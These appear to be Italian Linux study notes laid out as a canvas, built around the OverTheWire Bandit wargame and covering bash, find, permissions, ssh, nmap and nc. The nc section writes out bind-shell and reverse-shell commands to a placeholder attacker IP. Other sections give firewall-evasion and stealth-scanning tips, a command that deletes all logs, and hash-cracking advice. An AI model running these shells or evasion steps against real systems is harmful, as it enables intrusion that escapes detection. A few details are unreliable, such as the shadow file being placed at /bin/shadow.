		{"id":"b3872fe16b478ecb","type":"text","text":"# `inodes` e `filesystem`\n\nQuesta parte, premetto, è un po' un delirio. Spero di averci capito qualcosa.\n\nUno si immagina un `filesystem` come una struttura ad albero. In realtà non è così, perché posso creare dei link che collegano diversi nodi in modo non gerarchico: è un ***grafo aciclico diretto*** (***DAG***). E come rappresento un DAG? Ovviamente con una tabella in cui salvo i nodi (che chiamo ***inodes***) e cosa fanno, e.g. puntare a dei dati (`inode` di tipo `file`), puntare a elenchi di altri `inodes` (i.e. è una `directory`) o ad un altro `inode` (e.g. un `soft link` ad un `inode` di tipo `directory`, come avviene con `bin@`).\n\nOgni `filesystem` si presenta più o meno nello stesso modo. Prendiamone uno di tipo `ext4`.\n\n```bash\n+----------------+----------------+-----------------+---------------------+\n| Superblock     | Inode Table    | Data Blocks     | Journaling          |\n| (info su FS)   | (lista inode)  | (dati reali)    | (storico modifiche) |\n+----------------+----------------+-----------------+---------------------+\n```\n\nQuesta è la struttura di un ***file a blocchi***, che rappresenta un `filesystem`.\n\n- `superblock` - contiene i metadati come la `signature` (e.g. `0xEF53` identifica la formattazione `ext4`), lo stato del `filesystem` (e.g. `clean`, nessun problema, o `error`, ci sono problemi), dimensione dei vari blocchi e informazioni per gestire gli `inodes`;\n- `inode table` - contiene la logica con cui sono organizzati i dati. Ogni `filesystem` ha un `inode` di `root` da cui parte tutto, che ha sempre `numero` identificativo `1`;\n- `data blocks` - i dati veri e propri (e.g. blocchi puntati da `inodes` di tipo `file`);\n- `journaling` - lo storico modifiche dei blocchi e degli `inodes`.\n\nOttimo, quindi Linux ha un `filesystem`! ... ecco, non è così facile. Se così fosse, eseguendo `l -i` nella `root directory /` dovrei vedere tutti numeri di `inode` distinti. Ma se dico così ovviamente non succede questo: `/dev`, `/proc`, `/run` e `/sys` hanno tutte `inode 1`. Non solo! `/proc` e `/sys` risultano occupare `0` spazio su disco!\n\n... perché?!","x":3829,"y":-1249,"width":759,"height":848,"color":"4"},
		{"id":"2d903151dad0b196","type":"text","text":"# Esempi Avanzati di `find`\n\n```bash\n# Trovare file modificati negli ultimi 2 giorni e comprimerli\nfind /var/log -type f -mtime -2 -exec gzip {} \\;\n\n# Trovare e cambiare owner a tutti i file appartenenti a un utente\nfind /home -user vecchioutente -exec chown nuovoUtente:nuovoGruppo {} \\;\n\n# Trovare i 10 file più grandi nel sistema\nfind / -type f -exec du -h {} + | sort -rh | head -n 10\n\n# Trova e sposta i file più vecchi di 30 giorni in una cartella di backup\nfind /var/log -type f -mtime +30 -exec mv {} /backup/logs/ \\;\n\n# Trova ed elimina file temporanei più vecchi di una settimana\nfind /tmp -type f -name \"*.tmp\" -mtime +7 -delete\n```\n\nOra iniziamo ad entrare in cose serie.\n\n```bash\n# File posseduti da utenti inesistenti (account eliminati ma file rimasti)\nfind / -nouser -o -nogroup\n\n# Trova file con permessi pericolosi\nfind / -type f -perm 0777\n\n# Cancella tutti i log\nfind /var/log -name \"*.log\" -exec rm {} \\;\n\n# Trova tutte le cartelle a cui posso accedere e in cui posso scrivere\nfind / -type d -exec test -r {} -a -w {} \\; -print 2>/dev/null\n```","x":5847,"y":-1249,"width":759,"height":848,"color":"3"},
		{"id":"603628298b4df9a2","type":"text","text":"# Analizzare la Rete - `nmap`\n\nIn questo caso la mia ricerca parte dal fatto che volevo sapere cosa fosse il servizio sulla porta `30000` di `localhost`. L'ho capito? No, ma ci sono diverse cose interessanti.\n\n```bash\nnmap [options] [target]\n```\n\n fa una scansione delle porte aperte su `[target]` (nel nostro caso `localhost`, ci puoi mettere anche nomi che verranno risolti da `DNS`), provando a dirti che tipo di servizio offre ciascuna di esse. Puoi anche specificare\n\n- Più `[target]` separati da spazi (e.g. `localhost` `192.168.1.15` `google.com`);\n- Un intervallo di indirizzi `IP` (e.g. `192.168.1.1-100` fa uno scan dall'`host 1` al `100`);\n- Un'intera subnet (e.g. `192.168.1.0/24`).\n\nOvviamente più roba gli fai analizzare più ci mette, soprattutto se aggiungi le `[options]`:\n \n - `-pX` - Specifica le ***porte***. `X` può essere un numero (e.g. `-p 443`), un elenco di numeri (e.g. `-p 22, 80, 443`) in cui per ognuno specifico se testare `TCP` o `UDP` (e.g. `-p U:53,T:80,443`) o semplicemente un \"tutte le porte\" (`-p-`);\n\t - `--source port` permette di specificare la porta da cui faccio partire le richieste. Utile per ***bypassare i firewall*** (e.g. camuffandomi da richiesta `DNS`, porta `53`).\n - `-sX` - Specifica il ***tipo di scansione***. Non mi va di scriverle, vedi tabella e riquadri sopra. Aggiungo solo un paio di scansioni utili:\n\t - `-sV` - Riconosce servizi e versioni, spesso accoppiato con `--version-intensity X`, dove `X` definisce il rapporto `rapidità/efficienza` della scansione (da `0`, veloce ma poco affidabile, a `5`, lento ma accurato);\n\t - `-sS` - Il `SYN scan` è un altro trucco per essere stealth. Una connessione non completata ***potrebbe*** non essere salvata nei `log` di sistema.\n- `-PX` - Specifica il ***tipo di discovery*** (e.g. `-PE` è un `ping ICMP`, `-PR` è `ARP`). Se vuoi ignorare la discovery e fare uno scan di tutta la sottorete, `-Pn`.\n- `-TX` - Specifica la ***velocità*** dello scan, da `X = 0` (lentissimo, usato solo per bypassare IDS ultra-sensibili) a `5` (veloce e rumoroso, facilmente bloccato). Di default è `3`. Con `1` puoi stare abbastanza tranquillo, i `log` non dovrebbero registrarti;\n- `--script` - Permette di eseguire cose sulle porte trovate;\n- `-A` - In pratica è un \"all-in\" di molte altre opzioni (sarebbe `-O -sV --script=Default` + `traceroute`). Ovviamente è una roba rumorosissma e lentissima.","x":7866,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"c77fc76ca3f24940","type":"text","text":"# Interagire con la Rete - `nc`\n\nUn altro comando nella hall of fame dei più potenti. Di per sé è utile ad aprire connessioni, ma può fare molte cose (tanto che su alcune distribuzioni moderne è stato nerfato).\n\n```bash\nnc [options] [target]\n```\n\n- `-v [IP] [port]` apre una connessione `TCP` con il `[target]`. Funziona in modo simile a `Telnet`, posso inviare cose \"a mano\": se dall'altra parte ho un server `HTTP` posso ad esempio fare `GET / HTTP/1.1` e premere `ENTER` due volte, o come nel caso del `livello 14` magari il servizio è completamente homemade;\n\t- Se la porta è ***chiusa*** uscirà `Connection Refused`, se c'è un ***firewall*** che blocca la connessione il comando resterà bloccato, senza output;\n\t- `-v` di per sé potrei anche toglierlo (è `-verbose`), ma se lo faccio non esce scritto niente e potenzialmente non capisco cosa sta succedendo.\n- `-l -p [port]` si mette in ascolto (`-l`) sulla porta `[port]`;\n- `-u` usa `UDP` invece di `TCP`. Spesso usato per testare il `DNS` (e.g. `nc -u 192.168.1.1 53` controlla se un ipotetico default gateway è configurato come server `DNS`);\n- `-z -v [IP] [port_range]` fa una scansione simile a `nmap`. `-z` chiude la connessione subito dopo averla testata, e `-v` mostra i dettagli. `[port_range]` è `inizio-fine`;\n\t- Preferibile ad `nmap` in quanto più stealth.\n- Se la connessione non richiede autenticazione (e.g. su reti locali), posso realizzare un rapido trasferimento di file una senza usare roba tipo `FTP`. Sulla macchina ricevente predispongo un ascolto con `nc -l -p 1234 > received_file.txt`, mentre su quella che invia scrivo `cat toshare.txt | nc [IP] 1234`.\n\nOra, per quale motivo abbiamo detto che in alcune versioni `nc` viene nerfato? Il punto è che con l'opzione `-e` (`exec`) si può agilmente creare una ***backdoor***. Mi basta riuscire a far eseguire `nc -l -p 4444 -e /bin/bash` sul server, che di fatto associa alla connessione in ascolto sulla porta `4444` un terminale. Se dall'altra parte eseguo `nc -v [target IP] 4444`, tutto ***ciò che scrivo diventa l'input del terminale remoto***.\n\nSe questo non funziona (e.g. per un `firewall` restrittivo) posso usare una ***reverse shell***, i.e. fare questo stesso processo al contrario: io mi metto in ascolto in locale con `nc -l -p 4444` e faccio eseguire in remoto `nc [attacker IP] 4444 -e /bin/bash`. In questo modo è il server ad aprire una connessione verso l'esterno, il `firewall` di norma lascia passare. ","x":8875,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"ea6a4509f0ba551c","type":"text","text":"# Un Hacker si risveglia in una Rete sconosciuta...\n\nCosa fa?\n\n- ***Chi c'è nella rete?*** `nmap -sn 192.168.1.0/24` manda dei `ping` a tutta la sottorete, solo per vedere chi è attivo (non perde tempo a scansionare le porte);\n- ***Quali porte sono aperte?*** Poniamo che abbia trovato un dispositivo di suo interesse. Vediamo quali aperture offre con `nmap -p- 192.168.1.10`;\n- ***Cosa c'è dietro quelle porte?*** Abbiamo trovato aperte le porte `22`, `80` e `3306`. Ma che servizio offrono davvero? `nmap -sV -p 22,80,3306 192.168.1.10`!\n- ***Qual è il SO?*** `nmap -O 192.168.1.10`. Puoi specificargli di provare a dare una risposta anche se non ne è sicuro al $100\\%$ con `--osscan-guess`;\n- ***Possono rilevarmi?*** Di norma tutto quello che ho fatto finora lascia tracce nei log. Se arrivato a questo punto ho intenzione di fare cose un po' più sporche dovrei pormi il problema di non farmi rilevare. Posso sia rallentare lo scan (e.g. `-T1`) che evitare di chiudere le connessioni (e.g. `-sS`, così non mando l'`ACK` finale);\n- ***E se c'è un Firewall?*** Devo intanto capire se c'è. In genere tendono a bloccare tutti i pacchetti di connessioni non già aperte, quindi posso provare a mandare un `ACK` invece di un `SYN` (`nmap -sA 192.168.1.1`). In teoria questo gli farà pensare che è parte di una connessione già aperta, lasciandolo passare. Se invece viene bloccato anche così, significa che il `firewall` è forte ed è più difficile da ingannare;\n\t- Ci sono poi tecniche più nerd per evadere il `firewall`, tipo frammentare i pacchetti (`-f`), cambiare la dimensione dei pacchetti (e.g. `-mtu 16`) o aggiungere dati casuali per eludere pattern di rilevamento noti (e.g. `--data-length 50`).\n- ***Ci sono vulnerabilità?*** `nmap` prevede la possibilità di testare vulnerabilità note con la direttiva `--script=XXX`, dove `XXX` può essere un tot di cose che cercherai se servono.","x":7866,"y":-1249,"width":759,"height":848,"color":"4"},
		{"id":"0e6f99d9025a7954","type":"text","text":"# `openssl`\n\nUna roba per gestire e controllare i ***certificati***, nonché per ***crittare e decrittare*** messaggi.\n\n```bash\nopenssl [sub_command] [options]\n```\n\ndove chiaramente le `[options]` dipendono dal `[sub_command]`.\n\n- ***Gestione delle Chiavi*** - Usa `SSL/TLS` per le chiavi di cifratura (e.g. `openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:2048` genera una chiave privata `RSA`, e `openssl rsa -in private.key -pubout -out public.key` ne estrae la corrispondente chiave pubblica);\n- ***Gestione dei Certificati*** - <span style=\"color:rgb(236, 155, 14)\">Non mi va di scrivere sta roba, torna qui se serve.</span>\n- ***Connessione Crittata*** - Posso connettermi ad un server `SSL/TLS` lato client eseguendo `openssl s_client -connect [IP]:[port]`. Questo apre una connessione su CLI in stile `telnet`/`nc`, sulla quale tutto ciò che invio viene crittografato;\n\t- Con cosa? In fase di `handshaking`, il `client` invia una lista di cifrari supportati. Tra questi, il `server` sceglie il suo preferito;\n\t- In alternativa posso specificare quale voglio usare con `-cipher [algoritmo]`, ma a quel punto la domanda diventa: il `server` lo accetta? Diciamo che se sono io a configurarlo posso dirglielo, sempre con `-cipher`.","x":7866,"y":2118,"width":759,"height":951,"color":"3"},
		{"id":"7b351e91b16f865e","type":"text","text":"# Level 0\n\nLa password per il livello 1 si trova banalmente nel file `readme` del livello 0:\n\n```\nZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If\n```\n\nQuando fai `exit`, `SSH` ti avvisa se stai lasciando processi `running` o `stopped` (`CTRL + Z`). Se compare un `There are stopped/running jobs`, per non lasciare processi orfani fai\n\n```\nkill -9 $(jobs -p)\n```","x":-207,"y":1295,"width":759,"height":319,"color":"4"},
		{"id":"0f2a36c9dcf84a3e","type":"text","text":"# Linux `Bash` Commands (Bandit)\n\nApprofonditi in ordine di come compaiono in [Bandit](https://overthewire.org/wargames/bandit/bandit0.html) e di come mi gira.\n\nSi accede al livello `N` del gioco loggando in `ssh` all'`host` `bandit.labs.overthewire.org` mettendo come `user` `banditN` e come `password` quella ottenuta al livello `N-1`.\n\nLa sia username che password del livello zero sono `bandit0`. Nel seguito, il riquadro `Level N` contiene la soluzione per trovare la password del livello `N`.","x":-1216,"y":1296,"width":759,"height":319,"color":"6"},
		{"id":"f4f2a29153e51075","type":"text","text":"# Bash - Utility\n\n- `man [comando]` - Restituisce le istruzioni per il `comando`. Ha una vecchia versione basata su text editor chiamata `info`;\n- `apropos [pattern]` - Restituisce tutti i comandi che contengono `[pattern]` nella `SYNOPSIS` del manuale `man` (e.g. se voglio un comando che registra qualcosa potrei cercare `apropos capture`). Utile anche per capire quali comandi sono installati in una `shell` remota, o se ti ricordi cosa fa il `comando` ma non il nome;\n- `alias` - Restituisce tutti gli `alias`, definizioni homemade di comandi con diverse opzioni (e.g. `alias ll='ls -alF'`, i.e. se scrivo `ll` il terminale legge `ls -alf`);\n- `wc` - Restituisce il numero di  righe (`-l`), parole (`-w`) o `byte` (`char`, `-c`) di un `file1`. Se non specifico nessuna opzione, restituisce tutte queste cose in quest'ordine;\n- `du` - Disk Utilization della directory. Tipicamente utilizzato con opzioni `-ah` (restituisce il peso in formato leggibile di tutti i file della directory) o `-sh` (per le sole directory);\n- `sort` - Restituisce le righe di input in ordine lessicografico. Posso specificare `-n` (ordinamento numerico), `-r` (ordine inverso), `-u` (elimina i duplicati<span style=\"color:rgb(236, 155, 14)\">, in teoria, perché a me non ha mai funzionato</span>), `-k N` (ordina secondo la colonna `N`);\n- `strings` - Converte il contenuto di un file in stringhe stampabili;\n- `uniq` - Rimuove righe duplicate ***consecutive*** (quindi si usa spesso dopo `sort`). `-u` mostra solo le righe uniche, `-d` solo quelle duplicate, `-c` conta le occorrenze;\n\t- A me funziona solo come `sort data.txt | strings | uniq -u` (cfr. `livello 8`).\n- ","x":-2225,"y":2117,"width":759,"height":1278,"color":"3"},
		{"id":"430d8b04ba92b85a","type":"text","text":"# Espansioni condizionali\n\n| Sintassi          | Descrizione                                                           |\n| ----------------- | --------------------------------------------------------------------- |\n| `${VAR:-default}` | Se `VAR` è vuota o non esiste, usa `\"default\"` **ma non la assegna**. |\n| `${VAR:=default}` | Se `VAR` è vuota o non esiste, le assegna `\"default\"`.                |\n|                   |                                                                       |\n\n\n```bash\necho ${USER:-guest}   # Se USER non esiste, stampa \"guest\"\necho ${HOME:=/tmp}    # Se HOME non è settata, la assegna a \"/tmp\"\n```\n\n---\n\n| Sintassi                              | Descrizione                                 |\n| ------------------------------------- | ------------------------------------------- |\n| `${VAR:?Errore, VAR non è impostata}` | Se `VAR` non esiste, stampa errore ed esce. |\n|                                       |                                             |\n```bash\necho ${CONFIG_PATH:?Errore, variabile non settata!}\n```\n\nSe `CONFIG_PATH` è vuota, Bash stamperà\n\n```bash\nbash: CONFIG_PATH: Errore, variabile non settata!\n```\n\nUtile per script che richiedono variabili obbligatorie.\n\n---\n\n### Substringing e Sostituzioni Avanzate\n\n|Sintassi|Descrizione|\n|---|---|\n|`${VAR:0:5}`|Estrae una sottostringa: primi `5` caratteri.|\n|`${VAR//o/X}`|Sostituisce **tutti** gli \"o\" con \"X\".|\n|`${VAR/#Hello/Hi}`|Sostituisce `\"Hello\"` **all'inizio** con `\"Hi\"`.|\n|`${VAR/%World/Everyone}`|Sostituisce `\"World\"` **alla fine** con `\"Everyone\"`.|\n\n```bash\nVAR=\"HelloWorld\"\n\necho ${VAR:0:5}    # → \"Hello\"\necho ${VAR//o/X}   # → \"HellXWXrld\"\necho ${VAR/#Hello/Hi}  # → \"HiWorld\"\necho ${VAR/%World/Everyone}  # → \"HelloEveryone\"\n```","x":-3234,"y":2117,"width":759,"height":1278},
		{"id":"eab759960ddcf808","type":"text","text":"# Attaccare SSH\n\nPartiamo da un presupposto: se il server è configurato bene, è tendenzialmente difficile.\n\nNelle opzioni di configurazione, `sshd_config` può prevedere un numero massimo di tentativi da un certo `IP` (`MaxAuthTries`), oltre il quale un sistema come `fail2ban` può bannare il tuo `IP` (i.e. non accettare più alcun tentativo da parte tua).\n\nQuesto chiaramente presuppone che tu stia facendo brute force su una password debole. È però possibile che l'`host` accetti solo autenticazione con chiavi asimmetriche, rendendo di fatto qualsiasi attacco impossibile (a meno che non fai tipo MitM al momento dello scambio di chiavi, ma stiamo parlando di cose complicate).\n\nSe sei già dentro al sistema, potresti voler trovare le `password` di altri `user`. Questo si riduce a un meccanismo di hacking interno alla macchina, per cui dovresti avere i permessi per accedere a `/bin/shadow` e usare un tool come `hashcat` o `john` per risalire ai dati a partire dagli hash (cosa notoriamente difficile).","x":-1216,"y":-1038,"width":759,"height":439,"color":"4"},
		{"id":"4282f1f0f685c1b7","type":"text","text":"# `ssh-keygen` e Chiavi Asimmetriche\n\nSe non ti va di mettere la password ad ogni connessione (anche perché mandarla ogni volta in giro su Internet è una potenziale vulnerabilità) puoi creare una ***coppia di chiavi*** con il comando ***`ssh-keygen`*** e copiare la chiave pubblica sulla macchina remota con `ssh-copy-id user@host`. La scrittura più generale possibile è`ssh-keygen [opzioni] -t <algoritmo> [opzioni dell'algoritmo]`, dove\n\n- le `[opzioni]` includono `-f <file>` (specifica il file di output in cui vengono salvate le chiavi), `-C \"comment\"` (inserisce un commento, tipo \"`Chiave per GitHub`\"), `-N \"passphrase\"` (protegge l'accesso alla chiave privata), `-q` (modalità \"silenziosa\") e `-y` (data una chiave privata, ne estrae la pubblica);\n- `-t <algoritmo>` è in realtà facoltativo (in assenza di specifica si usa ***RSA*** con chiave a `3072 bit`), ma si usa in genere ***ed25519***, che rappresenta un buon compromesso tra sicurezza e velocità;\n- le `[opzioni dell'algoritmo]` si riducono di norma alla lunghezza della chiave (`-b`), ma ad esempio `ed25519` usa sempre chiavi a `256 bit`.\n\nLe chiavi private vengono salvate di default in `~/.ssh`, dove posso creare e settare un file `config` per specificare quale chiave usare per quale server (altrimenti, in modo molto poco furbo, `ssh` le prova tutte!).\n\n```\nHost mio-server\n    HostName server.example.com\n    User utente\n    IdentityFile ~/.ssh/mia_chiave\n```","x":-1216,"y":-30,"width":759,"height":686,"color":"4"},
		{"id":"8603be4ae948e472","type":"text","text":"# Opzioni Furbe\n\nLe `[options]` di `ssh` sono in realtà uno strumento molto potente.\n\n- `-N -f -q -L` - ha senso usarli insieme: `-N` apre una connessione senza terminale, e uno si potrebbe chiedere \"ma allora a che serve?\". Ecco perché parliamo anche di `-L`, che fa ***port forwarding*** dalle mie porte locali a quelle dell'host remoto. Cioè?\n\t- `-L <porta_locale>:<host_remoto>:<porta_remota>` si comporta così: quando arriva un qualcosa alla mia `porta_locale`, questo qualcosa viene reindirizzato direttamente alla `porta_remota` dell'`host_remoto`;\n\t\t- Nota che `host_remoto` potrebbe non essere l'`host` con cui ho stabilito la connessione `ssh`! Con `ssh -L 3306:192.168.1.50:4070 user@host` sto dicendo \"`Ciao host, mo' io ti mando qualsiasi cosa arrivi sulla mia porta 3306, tu devi girare tutto a 192.168.1.50:4070 (dal tuo punto di vista, i.e. come se fossi tu a mandarla). Come? Boh, veditela tu`\";\n\t\t- Di norma sta roba si usa per accedere ad un qualche servizio dal punto di vista di `host`, quindi scrivendo `ssh -L 3306:localhost:3307 user@host`. In pratica così sto dicendo una roba del tipo `Devi fare una roba per me, ti inoltro tutto ciò che passa sulla mia porta 3306 alla tua porta 3307` (***`localhost`*** è un placeholder per l'indirizzo di ***loopback*** `127.0.0.1`);\n\t- `-N` evita di aprire il terminale, quindi fa consumare meno risorse all'`host`, mentre `-f` mette il processo in ***background***;\n\t\t- Uno potrebbe pensare che così si guadagna in privacy, ma non è vero. Il processo resta visibile ad un comando `ps aux`, anche se si può provare a limitare la quantità di log registrati tramite la ***quiet mode*** (`-q`).\n\t- `-L` ha anche l'opzione inversa: `-R a:localhost:b` significa che tutto ciò che arriva all'`host` sulla porta remota `a` viene mandato alla mia macchina sulla porta `b`.\n- `-D` - Configura un ***proxy SOCKS***, i.e. un proxy che opera a livello di trasporto. Questo gli permette di inoltrare dati senza fare le solite porcate che fanno i proxy `HTTP` (e.g. filtrare il traffico, o spiarlo), nonché di inoltrare qualsiasi tipo di richiesta. `ssh -D 8080 user@host` sta dicendo ad `host` che quando arrivano richieste da me, lui deve mandarle su Internet come se venissero da lui. ","x":-207,"y":-1250,"width":759,"height":848,"color":"4"},
		{"id":"22dfa299c258426a","type":"text","text":"# SSH - `ssh [options] user@host`\n\n***Secure Shell*** usa di norma la  ***porta 22*** per connettere il proprio terminale ad un terminale remoto eseguito come `user` all'indirizzo `host` (che può sia essere un indirizzo `IP` sia un nome, che verrà in caso risolto da DNS).\n\nQuesto non significa che puoi entrare a caso nei sistemi altrui. Il campo `user` deve essere un utente registrato su quell'`host`, e ti verrà richiesta la sua `password`.\n\nLe opzioni di base includono\n\n- `-p 1234` - si connette alla porta `1234` invece che alla `22`;\n- `-i </path/to/key>` - specifica che chiave usare per la connessione;\n- `-T` - usalo se vuoi eseguire solo un comando (concatenato come \"`ssh -T user@host 'comando'`\" e poi chiudere la connessione, senza aprire una shell interattiva;\n- `-X` - se vuoi avviare applicazioni con una GUI X11 sull'`host` remoto, questa opzione ti permette di visualizzare tale GUI sul tuo computer (risultato simile si ottiene con `-Y`, che ha meno restrizioni di sicurezza e in genere si usa se `-X` non funziona).\n\nUna sessione funzionante si termina con `exit` o `CTRL + D`, una \"rotta\" con `~.` (senza poi premere invio!), altrimenti killando il processo `ssh` da un altro terminale (se proprio devi).","x":-207,"y":45,"width":759,"height":536,"color":"6"},
		{"id":"e660a0288c5cee37","type":"text","text":"# Sì ok, ma che è il `Bash`?\n\nUna ***shell*** è un interprete dei comandi dell'utente verso il SO: se vuoi dire qualcosa al cuore del tuo computer devi parlare il suo linguaggio, o in alternativa un linguaggio che qualcuno (i.e. la shell) traduce in comandi comprensibili per il SO.\n\nNel tempo sono state create diverse `shell`, a cui corrispondono diversi linguaggi. ***Bash*** (***Bourne Again Shell***) è un'evoluzione della prima `shell`, chiamata ***sh*** (***Bourne Shell***, che è il tizio che l'ha sviluppata). In mezzo ci sta un tot di roba, in parte ancora utilizzata (e.g. `ksh`) e in parte caduta nell'oblio (e.g. `csh`).\n","x":-2225,"y":1295,"width":759,"height":319,"color":"4"},
		{"id":"c61155df72f8f47a","type":"text","text":"# Expansions & History\n\n\nSalto le cose che so e ne scrivo due che non sapevo.\n\n- ***Expansions*** - `Bash` ti consente di creare shortcut per varie cose:\n\t- ***Brace Expansion*** - Tratta il contenuto di parentesi graffe `{}` come una lista:\n\t\t- `file{1,2,3}.txt` $\\to$ `file1.txt file2.txt file3.txt`;\n\t\t- `{a..f}` $\\to$ `a b c d e f`;\n\t\t- `{001..005}` $\\to$ `001 002 003 004 005`;\n\t\t- `{a..z..2}` $\\to$ `a c e g i ...` (espande con passo `2`);\n\t\t- `{A,B}{1,2,3}` $\\to$ `{A1 A2 A3 B1 B2 B3}` (fa il prodotto cartesiano).\n\t- ***Tilde Expansion*** - Quando `Bash` vede `~` lo espande nella `home directory` dell'utente corrente;\n\t- ***Parameter Expansion*** - Espande le variabili, e.g. `$HOME` $\\to$ `/home/user`;\n\t\t- Si possono mettere dentro robe condizionali\n\t- ***Command Substitution*** - `$(comando)` esegue il `comando` ed usa il suo output (si può fare anche con le `backtick`); \n\t- ***Arithmetic Expansion*** - `$((algebra))` esegue l'`algebra` ed usa il suo output;\n\t- ***Word Splitting*** - Dato `LIST=\"1 2 3\"`, ci sono due comportamenti di default:\n\t\t- `$LIST` splitta l'output, ovvero `1`, `2` e `3` sono entità separate;\n\t\t- `\"$LIST\"` conserva la struttura non splittata di stringa.\n\t- ***Pathname Expansion*** - Nell'indicare il nome di un file, posso usare `*` per indicare qualsiasi numero di qualsiasi caratteri, `?` per intendere un carattere qualsiasi, `[abc]` (***wildcard expansion***) per indicare una qualsiasi tra le lettere `a`, `b` e `c` e `{a,b,c}` (come in precedenza) per indicarle tutte.\n- ***History*** - `Bash` tiene traccia di quello che fai, ma oltre ad andare su e giù tra i comandi con le frecce puoi fare molto di più:\n\t- `history` visualizza tutti i comandi eseguiti, numerandoli riga per riga;\n\t- `!!` ripete l'ultimo comando eseguito;\n\t- `!n` esegue il comando `n` nella lista di `history`;\n\t- `!ssh` esegue l'ultimo comando nella `history` che inizia per `ssh`;\n\t- Se sbaglio a scrivere un comando, posso correggerlo con `^errore^correzione`;\n\t- `!$` espande l'argomento del precedente comando (e.g. `mkdir mydir; cd !$`).","x":-3234,"y":1008,"width":759,"height":894,"color":"4"},
		{"id":"1cdecb81c364493b","type":"text","text":"# Sono Dentro! Ora Cosa Faccio?\n\nBene, sono entrato in `ssh`. Sì, ma dove?\n\n- ***Kernel e SO*** - Posso stampare un riassunto con `uname -a`, che mostra \n\t- `nome_kernel`, e.g. `Linux`;\n\t- `hostname`, e.g. `my_pc`;\n\t- `versione_kernel`, e.g. `5.15.0-91-generic` (`generic` è la versione di Ubuntu);\n\t- `numero_build`, i.e. quante volte il kernel è stato ricompilato. In che senso? Quelli che distribuiscono il SO (e.g. ***Canonical*** per Ubuntu) non si mettono a firmare nuove versioni ad ogni minimo fix. Un aggiornamento minore (eseguito con `apt upgrade`) può includere una modifica al kernel ed una conseguente ricompilazione, che incrementa solo il numero di build, e.g. `#102-Ubuntu SMP Fri Jan 5 12:06:54 UTC 2024` (di norma ti dice anche quando è stato ricompilato l'ultima volta);\n\t\t- Se so che nella build `#102` c'è una ***vulnerabilità*** nota che è stata fixata solo successivamente (e.g. nella `#105`, l'ultima), posso sfruttarla per fare robe;\n\t\t- Se poi sono molto interessato a queste cose, con `cat /proc/version` trovo anche i dettagli sul tipo di compilatore usato.\n\t- `architettura`, e.g. `x86_64`;\n\t- `SO`, e.g. `GNU/Linux`;\n\t\t- Se mi interessa la distribuzione specifica del kernel, `cat /etc/os-release`. Questo in genere serve per capire la compatibilità dei SW che vuoi usare.\n- ***Chi sono io?*** - Potrei essere interessato a capire in qualità di che utente sono loggato.\n\t- `whoami` - Restituisce il nome dell'utente attuale (in teoria dovrei saperlo, se sono entrato con `ssh` dovrebbe coincidere con l'`user`);\n\t\t- <span style=\"color:rgb(236, 155, 14)\">Sono un utente standard o un account di servizio?</span> `cat /etc/passwd | grep $(whoami)` restituisce le righe del file `passwd` in cui compare il mio `user`. <span style=\"color:rgb(236, 155, 14)\">Se vedi qualcosa tipo `/bin/bash` o `/bin/sh` alla fine della riga, **sei un utente interattivo**. Se invece vedi `/usr/sbin/nologin` o `/bin/false`, è un account di servizio con accesso limitato.</span>\n\t- `id` - L'`user` è solo una label. Il SO mi identifica con un numero, detto ***UID***;\n\t\t- `0` corrisponde a `root`, `1-999` sono in genere utenti di sistema (e.g. servizi, demoni, ...) e `1000+` sono utenti normali;\n\t\t- Posso specificare `id -u mario` per sapere l'`UID` dell'utente `mario`;\n\t\t- A questo utente saranno associati anche dei gruppi, pertanto l'output di `id` sarà una lista `#id(group)` dove `#id` è il numero associato alla label `group`.\n- ***Chi sono gli altri?*** - Chi altro è loggato, e cosa sta facendo?\n\t- `who` e `w` permettono di vedere, rispettivamente, queste due cose;\n\t- `last` è uno storico degli accessi <span style=\"color:rgb(236, 155, 14)\">SSH</span>;\n- ***Cosa posso fare?*** - Per capirlo, mi serve sapere quali sono i miei privilegi. ","x":-207,"y":2117,"width":759,"height":1278,"color":"3"},
		{"id":"e218e0589f82e95a","type":"text","text":"# Premesse - Sistemi Operativi II","x":-1216,"y":4000,"width":759,"height":240,"color":"6"},
		{"id":"26065c6695f63b89","type":"text","text":"# Proprietari e Permessi\n\nQuando usi l'opzione `-l` in `ls` ci stanno diverse cose in output.\n```bash\n-rw-r--r-- 1 alice users 1234 Feb 21 12:00 file.txt\n```\n\n- Il primo `-` dell'esempio indica il tipo di `inode`, e può assumere gli stessi valori che specifico in una richiesta `-type` nel comando `find`;\n- I successivi `9` caratteri rappresentano i ***permessi*** per il ***proprietario*** (`alice`), per il ***gruppo*** (`users`) e, infine, per tutti gli ***altri*** (i.e. che non sono né `owner` né `group`);\n- Seguono numero di ***hard links***, dimensione, ultima modifica e nome del file.\n\nOgni gruppo di tre lettere (`rwx`) può essere rappresentato da una stringa binaria che ci dice cosa è attivo e cosa no (e.g. `101` $\\to$ `r-x`), ma possiamo ulteriormente comprimere questa informazione traducendola in decimale (e.g. `r-x` $\\to$ `101` $\\to$ `5`). Per questo, i permessi sono generalmente indicati con tre numeri da `0` a `7`.\n\nPosso modificare\n\n- i permessi, con `chmod [perm] [file]`, dove `[perm]` può essere sia una sacra triade ottale come vista prima (e.g.  `755`) o singole aggiunte/rimozioni come `u+x` (aggiunge il permesso di esecuzione al proprietario), `g-w` (toglie la scrittura al gruppo) o `o+r` (aggiunge la lettura a `others`);\n\t- ***Solo il proprietario e root*** possono usare `chmod`, indipendentemente dai permessi di scrittura attuali (modificare i permessi non conta come scrittura sul `file`).\n- il proprietario e il gruppo, con `chown new_owner:new_group [file]`. `:new_group` è opzionale, posso cambiare solo lui con `chgrp`.\n\t- ***Solo root*** può usare `chown`.","x":2820,"y":-1249,"width":759,"height":848,"color":"6"},
		{"id":"5cce19db2eacb68d","type":"file","file":"nmap_option_s.png","x":6857,"y":-818,"width":759,"height":417},
		{"id":"0ab6e3f18680f1a9","type":"text","text":"curl, watch, fc, ","x":6927,"y":-1409,"width":620,"height":320,"color":"1"},
